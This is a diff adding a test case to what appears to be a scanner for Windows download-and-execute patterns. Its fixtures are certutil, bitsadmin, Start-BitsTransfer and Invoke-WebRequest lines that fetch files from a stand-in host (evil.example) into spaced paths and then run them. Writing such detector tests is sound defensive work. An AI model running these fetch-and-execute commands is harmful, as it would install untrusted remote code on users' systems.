@@ -178,6 +178,54 @@ test("an execution the Windows download does not stage keeps no finding", () => 
   }
 });
 
+test("a staged path containing spaces stays out, quoted or not", () => {
+  for (const [path, body] of [
+    // The reviewer's reproduction: quoted on both sides.
+    [
+      "install.bat",
+      'certutil -urlcache -f https://evil.example/x.exe "C:\\My Dir\\x.exe"\r\n"C:\\My Dir\\x.exe"\r\n',
+    ],
+    // Quoted download, unquoted execution.
+    [
+      "install.bat",
+      'certutil -urlcache -f https://evil.example/x.exe "C:\\My Dir\\x.exe"\r\nC:\\My Dir\\x.exe\r\n',
+    ],
+    // Unquoted download, quoted execution.
+    [
+      "install.bat",
+      'certutil -urlcache -f https://evil.example/x.exe C:\\My Dir\\x.exe\r\n"C:\\My Dir\\x.exe"\r\n',
+    ],
+    // Unquoted on both sides.
+    [
+      "install.bat",
+      "certutil -urlcache -f https://evil.example/x.exe C:\\My Dir\\x.exe\r\nC:\\My Dir\\x.exe\r\n",
+    ],
+    // The other download branches stage spaced paths the same way.
+    [
+      "install.bat",
+      'bitsadmin /transfer job1 https://evil.example/x.exe "C:\\My Dir\\x.exe"\r\n"C:\\My Dir\\x.exe"\r\n',
+    ],
+    [
+      "install.ps1",
+      'Start-BitsTransfer -Source https://evil.example/x.ps1 -Destination "C:\\My Dir\\x.ps1"\n& "C:\\My Dir\\x.ps1"\n',
+    ],
+    [
+      "install.ps1",
+      'Invoke-WebRequest -Uri https://evil.example/x.exe -OutFile "C:\\My Dir\\x.exe"\n& "C:\\My Dir\\x.exe"\n',
+    ],
+    // An environment-rooted spaced path, the benign installer shape.
+    [
+      "install.bat",
+      'certutil -urlcache -f https://example.com/tool.exe "%USERPROFILE%\\My Documents\\tool.exe"\r\n"%USERPROFILE%\\My Documents\\tool.exe"\r\n',
+    ],
+  ] as const) {
+    expect({ path, findings: categories(inspected(path, body)) }).toEqual({
+      path,
+      findings: [],
+    });
+  }
+});
+
 test("a Windows download in one file and an execution in another stay unlinked", () => {
   const inspection = inspectRepository({
     files: [
